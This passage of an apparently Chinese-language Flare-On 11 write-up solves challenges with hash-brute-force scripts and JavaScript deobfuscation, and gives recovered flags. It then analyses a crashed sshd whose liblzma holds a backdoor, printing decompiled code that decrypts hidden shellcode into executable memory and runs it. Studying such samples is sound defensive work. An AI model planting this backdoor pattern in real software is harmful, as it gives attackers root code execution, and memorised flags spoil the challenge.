+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">target_hash = <span class="string">&quot;593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(<span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)), repeat=<span class="number">2</span>):</span><br><span class="line">    input_string = <span class="string">&#x27;&#x27;</span>.join(candidate)</span><br><span class="line">    </span><br><span class="line">    sha256_hash = hashlib.sha256(input_string.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sha256_hash == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;input_string&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>crc32腳本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">target_crc32 = <span class="number">0x7cab8d64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(<span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)), repeat=<span class="number">2</span>):</span><br><span class="line">    input_string = <span class="string">&#x27;&#x27;</span>.join(candidate)</span><br><span class="line"></span><br><span class="line">    calculated_crc32 = zlib.crc32(input_string.encode()) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> calculated_crc32 == target_crc32:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到匹配: <span class="subst">&#123;input_string&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以爆破出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">md5</span><br><span class="line">hash.md5(0, filesize) == &quot;b7dc94ca98aa58dabb5404541c812db2&quot;</span><br><span class="line">hash.md5(0, 2) == &quot;89484b14b36a8d5329426a3d944d2983&quot;  # ru</span><br><span class="line">hash.md5(76, 2) == &quot;f98ed07a4d5f50f7de1410d905f1477f&quot; # io</span><br><span class="line">hash.md5(50, 2) == &quot;657dae0913ee12be6fb2a6f687aae1c7&quot; # 3A</span><br><span class="line">hash.md5(32, 2) == &quot;738a656e8e8ec272ca17cd51e12f558b&quot; # ul</span><br><span class="line">crc</span><br><span class="line">hash.crc32(8, 2) == 0x61089c5c # re</span><br><span class="line">hash.crc32(34, 2) == 0x5888fc1b # eA</span><br><span class="line">hash.crc32(63, 2) == 0x66715919 # n.</span><br><span class="line">hash.crc32(78, 2) == 0x7cab8d64 # n:</span><br><span class="line">sha256</span><br><span class="line">hash.sha256(14, 2) == &quot;403d5f23d149670348b147a15eeb7010914701a7e99aad2e43f90cfa0325c76f&quot; # &lt;空格&gt;s</span><br><span class="line">hash.sha256(56, 2) == &quot;593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6&quot; # fl</span><br></pre></td></tr></table></figure>
+
+<p>再來是uint32條件都是通過簡單加減法或xor運算，不是一個range，所以可以直接還原</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uint32(52) ^ 425706662 == 1495724241</span><br><span class="line">uint32(17) - 323157430 == 1412131772</span><br><span class="line">uint32(59) ^ 512952669 == 1908304943</span><br><span class="line">uint32(28) - 419186860 == 959764852</span><br><span class="line">uint32(66) ^ 310886682 == 849718389</span><br><span class="line">uint32(10) + 383041523 == 2448764514</span><br><span class="line">uint32(37) + 367943707 == 1228527996</span><br><span class="line">uint32(22) ^ 372102464 == 1879700858</span><br><span class="line">uint32(46) - 412326611 == 1503714457</span><br><span class="line">uint32(70) + 349203301 == 2034162376</span><br><span class="line">uint32(80) - 473886976 == 69677856</span><br><span class="line">uint32(3) ^ 298697263 == 2108416586</span><br><span class="line">uint32(41) + 404880684 == 169911433</span><br></pre></td></tr></table></figure>
+
+<p>做到這裡就會發現其實flag應該只有中間的一小段是<br>上述條件還原後只會差一兩個flag沒有拿到<br>我是直接推理，把字元填進去就拿到flag了</p>
+<p><code>1RuleADayK33p$Malw4r3Aw4y@flare-on.com</code></p>
+<p>原本想寫z3但遇到一些問題，後來手逆花了一小時多就解玩了</p>
+<h1 id="4-Meme-Maker-3000"><a href="#4-Meme-Maker-3000" class="headerlink" title="4 - Meme Maker 3000"></a>4 - Meme Maker 3000</h1><p>一個網頁，是JS混淆題目</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/5.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/5.png" class=""></div>
+
+<p>其中最重要的就是這段了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a0k</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> t = a0p</span><br><span class="line">      , a = a0g[<span class="title function_">t</span>(<span class="number">0xa1d</span>)][<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;/&#x27;</span>)[<span class="title function_">t</span>(<span class="number">0x7e8</span>)]();</span><br><span class="line">    <span class="keyword">if</span> (a !== <span class="title class_">Object</span>[<span class="title function_">t</span>(<span class="number">0x59c5</span>)](a0e)[<span class="number">0x5</span>])</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">const</span> b = a0l[<span class="string">&#x27;textCo&#x27;</span> + <span class="string">&#x27;ntent&#x27;</span>]</span><br><span class="line">      , c = a0m[<span class="title function_">t</span>(<span class="number">0x10f5a</span>) + <span class="title function_">t</span>(<span class="number">0x125ab</span>)]</span><br><span class="line">      , d = a0n[<span class="string">&#x27;textCo&#x27;</span> + <span class="string">&#x27;ntent&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (a0c[<span class="title function_">t</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](b) == <span class="number">0xe</span> &amp;&amp; a0c[<span class="title function_">t</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](c) == a0c[<span class="title function_">t</span>(<span class="number">0x1544d</span>)] - <span class="number">0x1</span> &amp;&amp; a0c[<span class="title function_">t</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](d) == <span class="number">0x16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="keyword">new</span> <span class="title class_">Date</span>()[<span class="title function_">t</span>(<span class="number">0x1094a</span>) + <span class="string">&#x27;e&#x27;</span>]();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>()[<span class="title function_">t</span>(<span class="number">0x1094a</span>) + <span class="string">&#x27;e&#x27;</span>]() &lt; e + <span class="number">0xbb8</span>) &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> f = d[<span class="number">0x3</span>] + <span class="string">&#x27;h&#x27;</span> + a[<span class="number">0xa</span>] + b[<span class="number">0x2</span>] + a[<span class="number">0x3</span>] + c[<span class="number">0x5</span>] + c[c[<span class="title function_">t</span>(<span class="number">0x1544d</span>)] - <span class="number">0x1</span>] + <span class="string">&#x27;5&#x27;</span> + a[<span class="number">0x3</span>] + <span class="string">&#x27;4&#x27;</span> + a[<span class="number">0x3</span>] + c[<span class="number">0x2</span>] + c[<span class="number">0x4</span>] + c[<span class="number">0x3</span>] + <span class="string">&#x27;3&#x27;</span> + d[<span class="number">0x2</span>] + a[<span class="number">0x3</span>] + <span class="string">&#x27;j4&#x27;</span> + a0c[<span class="number">0x1</span>][<span class="number">0x2</span>] + d[<span class="number">0x4</span>] + <span class="string">&#x27;5&#x27;</span> + c[<span class="number">0x2</span>] + d[<span class="number">0x5</span>] + <span class="string">&#x27;1&#x27;</span> + c[<span class="number">0xb</span>] + <span class="string">&#x27;7&#x27;</span> + a0c[<span class="number">0x15</span>][<span class="number">0x1</span>] + b[<span class="title function_">t</span>(<span class="number">0x15e39</span>) + <span class="string">&#x27;e&#x27;</span>](<span class="string">&#x27;\x20&#x27;</span>, <span class="string">&#x27;-&#x27;</span>) + a[<span class="number">0xb</span>] + a0c[<span class="number">0x4</span>][<span class="title function_">t</span>(<span class="number">0x9a82</span>) + <span class="title function_">t</span>(<span class="number">0x1656b</span>)](<span class="number">0xc</span>, <span class="number">0xf</span>);</span><br><span class="line">        f = f[<span class="title function_">t</span>(<span class="number">0x143fc</span>) + <span class="title function_">t</span>(<span class="number">0x8c67</span>)](),</span><br><span class="line">        <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="title function_">t</span>(<span class="number">0x14e2b</span>) + <span class="title function_">t</span>(<span class="number">0x4c22</span>) + <span class="string">&#x27;YXRpb2&#x27;</span> + <span class="title function_">t</span>(<span class="number">0x1708e</span>) + <span class="title function_">t</span>(<span class="number">0xaa98</span>) + <span class="title function_">t</span>(<span class="number">0x16697</span>) + <span class="title function_">t</span>(<span class="number">0x109c4</span>)) + f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>當他滿足一些條件後就會alert出flag給你，那就來修復a、b、c、d分別是甚麼吧</p>
+<p>a比較複雜，先看b、c、d</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b = a0l[<span class="string">&#x27;textCo&#x27;</span> + <span class="string">&#x27;ntent&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<p>b是a0l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0l = document[a0p(0xcd59) + a0p(0x11e77) + &#x27;Id&#x27;](&#x27;captio&#x27; + &#x27;n1&#x27;)</span><br></pre></td></tr></table></figure>
+<p><code>a0p(0xcd59) + a0p(0x11e77) + &#39;Id&#39;</code>是<code>getElementById</code><br>所以整句其實就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;caption1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>也就是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;caption1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;caption&quot;</span> <span class="attr">contenteditable</span>=<span class="string">&quot;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;top: 10%; left: 75%;&quot;</span>&gt;</span>FLARE On<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>textContent就是它包含的字<br>所以是比較上述東西有沒有等於(t&#x3D;a0p)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0c[<span class="title function_">a0p</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](b) == <span class="number">0xe</span></span><br></pre></td></tr></table></figure>
+<p>也就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0c[<span class="string">&#x27;indexOf&#x27;</span>](b) == <span class="number">0xe</span></span><br></pre></td></tr></table></figure>
+
+<p>a0c[0xe]是<code>FLARE On</code></p>
+<p>再來是c</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0m = <span class="variable language_">document</span>[<span class="title function_">a0p</span>(<span class="number">0xcd59</span>) + <span class="title function_">a0p</span>(<span class="number">0x11e77</span>) + <span class="string">&#x27;Id&#x27;</span>](<span class="title function_">a0p</span>(<span class="number">0x14b7b</span>) + <span class="string">&#x27;n2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>修成</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;caption2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;caption2&quot; class=&quot;caption&quot; contenteditable=&quot;&quot; style=&quot;top: 55%; left: 75%;&quot;&gt;Reading someone else&#x27;s code&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0m[<span class="title function_">a0p</span>(<span class="number">0x10f5a</span>) + <span class="title function_">a0p</span>(<span class="number">0x125ab</span>)]</span><br></pre></td></tr></table></figure>
+
+<p>就是textContent -&gt; 包含的字</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a0c[<span class="title function_">a0p</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](c) == a0c[<span class="title function_">a0p</span>(<span class="number">0x1544d</span>)] - <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
+
+<p>他的意思是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a0c[<span class="string">&#x27;indexOf&#x27;</span>](c) == a0c[length] - <span class="number">0x1</span></span><br><span class="line">a0c[<span class="string">&#x27;indexOf&#x27;</span>](c) == <span class="number">25</span></span><br><span class="line"><span class="title class_">Security</span> <span class="title class_">Expert</span></span><br></pre></td></tr></table></figure>
+
+<p>最後是 d，就不贅述，就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a0c[<span class="title function_">a0p</span>(<span class="number">0x12d23</span>) + <span class="string">&#x27;f&#x27;</span>](d) == <span class="number">0x16</span></span><br><span class="line">a0c[<span class="string">&#x27;indexOf&#x27;</span>](d) == <span class="number">0x16</span></span><br><span class="line">a0c[<span class="number">0x16</span>]</span><br><span class="line"><span class="title class_">Malware</span></span><br></pre></td></tr></table></figure>
+
+<p>這樣就得到了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">&#x27;FLARE On&#x27;</span>,</span><br><span class="line">c = <span class="string">&#x27;Security Expert&#x27;</span>,</span><br><span class="line">d = <span class="string">&#x27;Malware&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>回到a</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = a0g[<span class="title function_">t</span>(<span class="number">0xa1d</span>)][<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;/&#x27;</span>)[<span class="title function_">a0p</span>(<span class="number">0x7e8</span>)]();</span><br><span class="line">a = a0g.<span class="property">alt</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">pop</span>()</span><br></pre></td></tr></table></figure>
+
+<p>他需要滿足</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a !== <span class="title class_">Object</span>[<span class="title function_">a0p</span>(<span class="number">0x59c5</span>)](a0e)[<span class="number">0x5</span>]</span><br></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a !== <span class="title class_">Object</span>[<span class="string">&#x27;key&#x27;</span>](a0e)[<span class="number">0x5</span>]</span><br></pre></td></tr></table></figure>
+
+<p>這邊往上追可以看到這個</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a0g = <span class="variable language_">document</span>[<span class="title function_">a0p</span>(<span class="number">0xcd59</span>) + <span class="title function_">a0p</span>(<span class="number">0x11e77</span>) + <span class="string">&#x27;Id&#x27;</span>](<span class="title function_">a0p</span>(<span class="number">0x1b97</span>) + <span class="title function_">a0p</span>(<span class="number">0xf101</span>))</span><br><span class="line">  , a0h = <span class="variable language_">document</span>[<span class="title function_">a0p</span>(<span class="number">0xcd59</span>) + <span class="title function_">a0p</span>(<span class="number">0x11e77</span>) + <span class="string">&#x27;Id&#x27;</span>](<span class="title function_">a0p</span>(<span class="number">0x10ea7</span>) + <span class="title function_">a0p</span>(<span class="number">0xc6b6</span>) + <span class="string">&#x27;er&#x27;</span>)</span><br><span class="line">  , a0i = <span class="variable language_">document</span>[<span class="title function_">a0p</span>(<span class="number">0xcd59</span>) + <span class="string">&#x27;mentBy&#x27;</span> + <span class="string">&#x27;Id&#x27;</span>](<span class="title function_">a0p</span>(<span class="number">0xfb23</span>))</span><br><span class="line">  , a0j = <span class="variable language_">document</span>[<span class="title function_">a0p</span>(<span class="number">0xcd59</span>) + <span class="string">&#x27;mentBy&#x27;</span> + <span class="string">&#x27;Id&#x27;</span>](<span class="title function_">a0p</span>(<span class="number">0x10757</span>) + <span class="title function_">a0p</span>(<span class="number">0x1757a</span>) + <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>還原完後變這樣</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a0g = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;meme-image&#x27;</span>),</span><br><span class="line">  a0h = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;meme-container&#x27;</span>),</span><br><span class="line">  a0i = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;remake&#x27;</span>),</span><br><span class="line">  a0j = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;meme-template&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>既然他是抓a0g.alt，那就去追a0g相關條件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a0g[<span class="title function_">s</span>(<span class="number">0xa1d</span>)] = a0j[<span class="title function_">s</span>(<span class="number">0x3b9f</span>)],</span><br><span class="line">a0g.<span class="property">alt</span> = a0j.<span class="property">value</span></span><br></pre></td></tr></table></figure>
+
+<p>追a0j.value是，也就是他圖片的名稱</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;meme-template&quot;</span>&gt;</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;doge1.png&quot;</span>&gt;</span>Doge<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;draw.jpg&quot;</span>&gt;</span>Draw 25<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;drake.jpg&quot;</span>&gt;</span>Drake<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;two_buttons.jpg&quot;</span>&gt;</span>Two Buttons<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;boy_friend0.jpg&quot;</span>&gt;</span>Distracted Boyfriend<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;success.jpg&quot;</span>&gt;</span>Success<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;disaster.jpg&quot;</span>&gt;</span>Disaster<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;aliens.jpg&quot;</span>&gt;</span>Aliens<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">        &lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而<code>Object.keys(a0e)[5]</code>是<code>boy_friend0.jpg</code><br>這樣就還原了 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;boy_friend0.jpg&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>最後直接改javascript的a b c d 值成我們要的就get flag</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/6.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/6.png" class=""></div>
+
+
+<p>後來發現線上反混淆器可以很好的直接還原大多數東西<br><a target="_blank" rel="noopener" href="https://deobfuscate.relative.im/">https://deobfuscate.relative.im/</a></p>
+<h1 id="5-sshd"><a href="#5-sshd" class="headerlink" title="5-sshd"></a>5-sshd</h1><p>這題非常有趣，首先我他提敘說因為crash，要我們找出crash的點，先gdb分析他的coredump(<code>/home/naup/Desktop/flareon5/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676</code>)</p>
+<p>用這樣來debug coredump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb /home/naup/Desktop/flareon5/usr/sbin/sshd sshd.core.93794.0.0.11.1725917676</span><br></pre></td></tr></table></figure>
+<p>一開始看到他死在call null byt</p>
+<p>用bt回朔，發現他是在liblzma.so.5，crash點在<code>0x00007f4a18c8f88f</code></p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/7.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/7.png" class=""></div>
+
+<p>這區段被delete了，應該就是binary載入liblzma.so.5的區段<br>0x00007f4a18c8f88f-0x7f4a18c86000 &#x3D; offset(0x988f)</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/8.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/8.png" class=""></div>
+
+<p>先把liblzma抓下來分析吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009887                 mov     rsi, rbp</span><br><span class="line">.text:000000000000988A                 mov     edi, r12d</span><br><span class="line">.text:000000000000988D                 call    rax</span><br><span class="line">.text:000000000000988F                 mov     rbx, [rsp+128h+var_40]</span><br><span class="line">.text:0000000000009897                 xor     rbx, fs:28h</span><br></pre></td></tr></table></figure>
+<p>這邊應該就是crash的點，他call rax時，call到了Null pointer<br>這邊是一個decrypt相關的函數</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_9820</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, _DWORD *a2, __int64 a3, __int64 a4, <span class="type">unsigned</span> <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> (*v13)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-120h]</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">200</span>]; <span class="comment">// [rsp+20h] [rbp-108h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+E8h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = <span class="string">&quot;RSA_public_decrypt&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *a2 == <span class="number">-985630136</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_93F0(v14, a2 + <span class="number">1</span>, a2 + <span class="number">9</span>, <span class="number">0LL</span>);</span><br><span class="line">      v12 = mmap(<span class="number">0LL</span>, dword_32360, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">      v13 = (<span class="type">void</span> (*)(<span class="type">void</span>))<span class="built_in">memcpy</span>(v12, &amp;unk_23960, dword_32360);</span><br><span class="line">      sub_9520(v14, v13, dword_32360);</span><br><span class="line">      v13();</span><br><span class="line">      sub_93F0(v14, a2 + <span class="number">1</span>, a2 + <span class="number">9</span>, <span class="number">0LL</span>);</span><br><span class="line">      sub_9520(v14, v13, dword_32360);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="string">&quot;RSA_public_decrypt &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = dlsym(<span class="number">0LL</span>, v9);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(_QWORD, _DWORD *, __int64, __int64, _QWORD))v10)(a1, a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>中間有一整塊很像寫shellcode的區塊<br>他需要滿足一些條件<br>他先mmap了一塊記憶體v12<br>之後copy記憶體大小的東西(unk_23960)到v12中並返回pointer<br>這東西看起來像是encrypt過的shellcode</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/aaa.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/aaa.png" class=""></div>
+
